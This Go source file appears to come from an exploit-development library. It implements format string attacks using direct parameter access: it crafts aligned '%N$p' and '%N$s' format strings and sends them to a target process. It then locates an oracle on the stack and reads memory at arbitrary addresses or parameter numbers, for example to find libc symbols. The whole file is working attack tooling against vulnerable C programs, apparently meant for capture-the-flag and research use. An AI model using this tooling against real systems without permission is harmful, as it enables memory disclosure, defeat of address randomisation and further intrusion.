package memory

import (
	"bytes"
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"log"
	mathrand "math/rand"
)

// DPAFormatStringConfig is used to configure format string attacks that
// specifically rely on the direct parameter access (DPA) feature found
// in the format family of C functions.
type DPAFormatStringConfig struct {
	// ProcessIOFn is a function that returns a process' ProcessIO,
	// which is used to interact with the process.
	ProcessIOFn func() ProcessIO

	// MaxNumParams is the maximum number of DPA argument numbers
	// that will be accessed. This is required in order to
	// guarantee that the resulting format string will be correctly
	// padded to hold that upper limit without shifting the
	// alignment of the string with the size of a pointer on
	// the target system.
	MaxNumParams int

	// PointerSize is the size of a pointer on the target system
	// in bytes. Generally speaking, this is the number of bits
	// divided by 8. For example, a 64-bit pointer would be
	// 8 bytes. This is used to ensure that the resulting
	// format string is aligned with the amount of data that
	// a format string function reads per format specifier.
	PointerSize int

	// Verbose is an optional *log.Logger that can be used to
	// obtain more information when interacting with a process
	// while sending and receiving a format string.
	Verbose *log.Logger
}

func (o DPAFormatStringConfig) validate() error {
	if o.ProcessIOFn == nil {
		return fmt.Errorf("get process function cannot be nil")
	}

	if o.MaxNumParams <= 0 {
		return fmt.Errorf("maximum number of format function parameters must be greater than 0")
	}

	if o.PointerSize <= 0 {
		return fmt.Errorf("pointer size in bytes must be greater than 0")
	}

	return nil
}

// SetupFormatStringLeakViaDPAOrExit calls SetupFormatStringLeakViaDPA,
// subsequently invoking DefaultExitFn if an error occurs.
func SetupFormatStringLeakViaDPAOrExit(config DPAFormatStringConfig) *FormatStringLeaker {
	f, err := SetupFormatStringLeakViaDPA(config)
	if err != nil {
		DefaultExitFn(fmt.Errorf("failed to create format string param leaker - %w", err))
	}
	return f
}

// SetupFormatStringLeakViaDPA sets up a new FormatStringLeaker by leaking
// the direct parameter access (DPA) argument number of an oracle in a
// specially-crafted format string. This oracle is replaced with a memory
// address when users call the struct's method.
func SetupFormatStringLeakViaDPA(config DPAFormatStringConfig) (*FormatStringLeaker, error) {
	setupConfig := dpaLeakSetupConfig{
		dpaConfig: config,
		builderAndMemAlignedLenFn: func() (formatStringBuilder, int) {
			builder := formatStringBuilder{
				returnDataDelim:  []byte("|"),
				endOfStringDelim: []byte("foozlefu"),
			}
			buff := bytes.NewBuffer(nil)
			builder.appendDPALeak(config.MaxNumParams, []byte("p"), buff)

			return builder, stringLenMemoryAligned(buff.Bytes(), config.PointerSize)
		},
	}

	dpaLeakConfig, err := createDPAFormatStringLeakWithLastValueAsArg(setupConfig)
	if err != nil {
		return nil, err
	}

	return &FormatStringLeaker{
		procIOFn:  config.ProcessIOFn,
		builder:   dpaLeakConfig.builder,
		formatStr: dpaLeakConfig.builder.buildDPA(dpaLeakConfig.paramNum, []byte("s"), dpaLeakConfig.alignLen),
	}, nil
}

// dpaLeakSetupConfig configures a DPA format string leak.
type dpaLeakSetupConfig struct {
	// dpaConfig is the user-specified DPAFormatStringConfig.
	dpaConfig DPAFormatStringConfig

	// builderAndMemAlignedLenFn is a function that returns the
	// formatStringBuilder that will be used to leak an oracle
	// string. It also returns the length the string must be
	// padded to in order to both fit user-specified arguments,
	// and remain aligned with the target system's pointer size.
	builderAndMemAlignedLenFn func() (formatStringBuilder, int)
}

// createDPAFormatStringLeakWithLastValueAsArg does the hard work involved
// in identifying the location of a value within a format string using
// the direct parameter access (DPA) feature. The returned *dpaLeakConfig
// allows users to recreate the format string, which will be structured
// such that the last value in the string is pointed to by the DPA number
// saved in the object.
func createDPAFormatStringLeakWithLastValueAsArg(config dpaLeakSetupConfig) (*dpaLeakConfig, error) {
	err := config.dpaConfig.validate()
	if err != nil {
		return nil, err
	}

	oracle, err := randomStringOfCharsAndNums(config.dpaConfig.PointerSize)
	if err != nil {
		return nil, fmt.Errorf("failed to generate oracle string - %w", err)
	}

	invertedOracle := make([]byte, config.dpaConfig.PointerSize)
	for i := 0; i < config.dpaConfig.PointerSize; i++ {
		invertedOracle[i] = oracle[config.dpaConfig.PointerSize-i-1]
	}

	// TODO: Some platforms do not include '0x' in the format
	//  function's output.
	formattedOracle := []byte(fmt.Sprintf("0x%x", oracle))
	invertedFormattedOracle := []byte(fmt.Sprintf("0x%x", invertedOracle))

	if config.dpaConfig.Verbose != nil {
		config.dpaConfig.Verbose.Printf("formatted leak oracle: '%s' - invterted: '%s'",
			formattedOracle, invertedFormattedOracle)
	}

	fmtStrBuilder, memoryAlignedLen := config.builderAndMemAlignedLenFn()
	specifier := []byte{'p'}

	i := 0
	for ; i < config.dpaConfig.MaxNumParams; i++ {
		buff := bytes.NewBuffer(nil)
		fmtStrBuilder.appendDPALeak(i, specifier, buff)

		leakedValue, err := leakDataWithFormatString(
			config.dpaConfig.ProcessIOFn(),
			append(fmtStrBuilder.build(memoryAlignedLen, buff), oracle...),
			fmtStrBuilder)
		if err != nil {
			return nil, err
		}

		if bytes.Equal(leakedValue, formattedOracle) || bytes.Equal(leakedValue, invertedFormattedOracle) {
			return &dpaLeakConfig{
				paramNum: i,
				alignLen: memoryAlignedLen,
				builder:  fmtStrBuilder,
			}, nil
		}
	}

	return nil, fmt.Errorf("failed to find leak oracle after %d writes", i)
}

// dpaLeakConfig represents a successful leak of an oracle in a format string
// using the direct parameter access feature.
type dpaLeakConfig struct {
	// paramNum is the DPA argument number at which the oracle
	// was found.
	paramNum int

	// alignLen is the length that the string needs to be padded
	// to in order to be consistently aligned with the size of
	// a pointer on the target system.
	alignLen int

	// builder is the formatStringBuilder used to build the original
	// oracle format string.
	builder formatStringBuilder
}

// FormatStringLeaker abstracts leaking memory at a specified address using
// a format string.
type FormatStringLeaker struct {
	formatStr []byte
	builder   formatStringBuilder
	procIOFn  func() ProcessIO
}

// MemoryAtOrExit calls FormatStringLeaker.MemoryAt, subsequently calling
// DefaultExitFn if an error occurs.
func (o FormatStringLeaker) MemoryAtOrExit(pointer Pointer) []byte {
	p, err := o.MemoryAt(pointer)
	if err != nil {
		DefaultExitFn(fmt.Errorf("failed to read memory at 0x%x - %w", pointer.Bytes(), err))
	}
	return p
}

// MemoryAt attempts to read the memory at the specified pointer.
func (o FormatStringLeaker) MemoryAt(pointer Pointer) ([]byte, error) {
	return leakDataWithFormatString(o.procIOFn(), o.FormatString(pointer), o.builder)
}

// FormatString returns a new format string that can be used to leak
// memory at the specified pointer.
func (o FormatStringLeaker) FormatString(pointer Pointer) []byte {
	return append(o.formatStr, pointer.Bytes()...)
}

// NewDPAFormatStringLeakerOrExit calls NewDPAFormatStringLeaker, subsequently
// calling DefaultExitFn if an error occurs.
func NewDPAFormatStringLeakerOrExit(config DPAFormatStringConfig) *DPAFormatStringLeaker {
	res, err := NewDPAFormatStringLeaker(config)
	if err != nil {
		DefaultExitFn(fmt.Errorf("failed to create new format string direct parameter access number leaker - %w", err))
	}
	return res
}

// NewDPAFormatStringLeaker returns a new instance of a *DPAFormatStringLeaker.
func NewDPAFormatStringLeaker(config DPAFormatStringConfig) (*DPAFormatStringLeaker, error) {
	err := config.validate()
	if err != nil {
		return nil, err
	}

	fmtStrBuilder := formatStringBuilder{
		returnDataDelim:  []byte("|"),
		endOfStringDelim: []byte("foozlefu"),
	}

	unalignedBuff := bytes.NewBuffer(nil)
	fmtStrBuilder.appendDPALeak(config.MaxNumParams, []byte("p"), unalignedBuff)

	return &DPAFormatStringLeaker{
		config:     config,
		builder:    fmtStrBuilder,
		alignedLen: stringLenMemoryAligned(unalignedBuff.Bytes(), config.PointerSize),
	}, nil
}

// DPAFormatStringLeaker leaks memory using direct access parameter (DPA)
// argument numbers. It provides helper methods for identifying the
// parameter number for a piece of data (such as a memory pointer).
type DPAFormatStringLeaker struct {
	// config is the user-specified DPAFormatStringConfig.
	config DPAFormatStringConfig

	// builder is the formatStringBuilder that will be used
	// to construct new format strings.
	builder formatStringBuilder

	// alignedLen is the length that the format string must be
	// padded to in order to fit the user's arguments while
	// remaining aligned with the size of a pointer
	// on the target system.
	alignedLen int
}

// FindParamNumberOrExit calls FindParamNumber, subsequently calling
// DefaultExitFn if an error occurs.
func (o DPAFormatStringLeaker) FindParamNumberOrExit(target []byte) (int, bool) {
	i, b, err := o.FindParamNumber(target)
	if err != nil {
		DefaultExitFn(err)
	}
	return i, b
}

// FindParamNumber finds the specified data by iterating through direct
// parameter access argument numbers. If it finds the specified data,
// it returns its corresponding parameter number and true. If the
// target data could not be found, then it returns 0 and false.
//
// This is useful for finding the location of data (such as libc
// symbols) that appear in the format function's stack frame.
func (o DPAFormatStringLeaker) FindParamNumber(target []byte) (int, bool, error) {
	for i := 0; i < o.config.MaxNumParams; i++ {
		result, err := o.MemoryAtParam(i)
		if err != nil {
			return 0, false, fmt.Errorf("failed to get memory at direct access param number %d - %w",
				i, err)
		}

		if o.config.Verbose != nil {
			o.config.Verbose.Printf("FindParamNumber read: '%s'", result)
		}

		if bytes.Equal(target, result) {
			if o.config.Verbose != nil {
				o.config.Verbose.Printf("FindParamNumber found target: '%s'", target)
			}
			return i, true, nil
		}
	}

	return 0, false, nil
}

// MemoryAtParamOrExit calls MemoryAtParam, subsequently calling DefaultExitFn
// if an error occurs.
func (o DPAFormatStringLeaker) MemoryAtParamOrExit(paramNumber int) []byte {
	res, err := o.MemoryAtParam(paramNumber)
	if err != nil {
		DefaultExitFn(fmt.Errorf("failed to get memory at param number %d - %w", paramNumber, err))
	}
	return res
}

// MemoryAtParam returns the memory found at the specified direct access
// parameter argument number.
func (o DPAFormatStringLeaker) MemoryAtParam(paramNumber int) ([]byte, error) {
	if paramNumber > o.config.MaxNumParams {
		// This is a problem because it may potentially shift
		// the arguments on the stack, and make the result
		// of the format string function unpredictable.
		return nil, fmt.Errorf("requested parameter number %d exceeds maximum params of %d",
			paramNumber, o.config.MaxNumParams)
	}

	return leakDataWithFormatString(o.config.ProcessIOFn(), o.FormatString(paramNumber), o.builder)
}

// FormatString returns a new format string that can be used to leak data
// at the specified direct parameter access argument number.
func (o DPAFormatStringLeaker) FormatString(paramNum int) []byte {
	return o.builder.buildDPA(paramNum, []byte{'p'}, o.alignedLen)
}

// leakDataWithFormatString attempts to leak memory using a format string
// built with the specified formatStringBuilder. It extracts the data
// returned by the call to the format string function by examining the
// data between the resulting string's delimiters.
//
// TODO: Support for retrieving multiple values.
//  E.g., |0x0000000000000001||0x0000000000000002|endstrdel
func leakDataWithFormatString(process ProcessIO, formatStr []byte, builder formatStringBuilder) ([]byte, error) {
	err := builder.isSuitableForLeaking()
	if err != nil {
		return nil, fmt.Errorf("format string is not suitable for leaking data - %w", err)
	}

	err = process.WriteLine(formatStr)
	if err != nil {
		return nil, fmt.Errorf("failed to write format string to process - %w", err)
	}

	token, err := process.ReadUntil(builder.endOfStringDelim)
	if err != nil {
		return nil, fmt.Errorf("failed to find end of string delim in process output - %w", err)
	}

	firstSepIndex := bytes.Index(token, builder.returnDataDelim)
	if firstSepIndex == -1 {
		return nil, fmt.Errorf("returned string does not contain first foramt string separator")
	}

	lineWithoutFirstSep := token[firstSepIndex+1:]
	lastSepIndex := bytes.Index(lineWithoutFirstSep, builder.returnDataDelim)
	if lastSepIndex == -1 {
		return nil, fmt.Errorf("returned string does not contain second foramt string separator")
	}

	return lineWithoutFirstSep[0:lastSepIndex], nil
}

// stringLenMemoryAligned calculates a (potentially) new length that the
// string should be stretched to given the corresponding pointer size.
//
// This is necessary because functions reads data in chunks that correspond
// to the platform's pointer size (e.g., 64-bit being 8 bytes). If a string
// is 9 bytes long, that 9th byte will be mixed in with other data.
//
// This problem can be circumvented by simply padding the string to a length
// that is divisible by the specified pointer size.
func stringLenMemoryAligned(stringWithoutPadding []byte, pointerSizeBytes int) int {
	maxStringLen := len(stringWithoutPadding)
	padLen := 0
	for {
		if (maxStringLen + padLen) % pointerSizeBytes == 0 {
			break
		}
		padLen++
	}
	return padLen + maxStringLen
}

// prependStringWithCharUntilLen prepends the specified string with a character
// until it equals the specified length.
func prependStringWithCharUntilLen(str []byte, c byte, newLen int) []byte {
	strLen := len(str)
	if strLen >= newLen {
		return str
	}

	return append(bytes.Repeat([]byte{c}, newLen-strLen), str...)
}

// appendStringWithCharUntilLen appends the specified string with a character
// until it equals the specified length.
func appendStringWithCharUntilLen(str []byte, c byte, newLen int) []byte {
	strLen := len(str)
	if strLen >= newLen {
		return str
	}

	return append(str, bytes.Repeat([]byte{c}, newLen-strLen)...)
}

// randomStringOfCharsAndNums returns a new string of human-readable characters
// equal to the specified length.
//
// The random seed is generated using crypto/rand.Read.
func randomStringOfCharsAndNums(numChars int) ([]byte, error) {
	if numChars <= 0 {
		return nil, fmt.Errorf("number of random characters cannot be less than or equal to zero")
	}

	const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"

	rawRandom := make([]byte, 8)
	_, err := rand.Read(rawRandom)
	if err != nil {
		return nil, err
	}

	src := mathrand.NewSource(int64(binary.BigEndian.Uint64(rawRandom)))

	random := mathrand.New(src)

	result := make([]byte, numChars)
	for i := 0; i < numChars; i++ {
		result[i] = chars[random.Intn(len(chars))]
	}

	return result, nil
}
